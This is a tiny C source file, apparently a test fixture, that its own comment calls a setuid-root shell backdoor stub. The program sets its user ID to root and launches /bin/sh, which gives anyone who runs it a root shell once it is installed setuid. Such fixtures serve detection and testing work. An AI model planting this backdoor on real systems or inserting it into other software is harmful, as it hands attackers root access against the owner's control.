// Fixture: minimal setuid-root shell backdoor stub.
#include <unistd.h>
#include <stdlib.h>
int main(void) {
  setuid(0);
  system("/bin/sh");
  return 0;
}
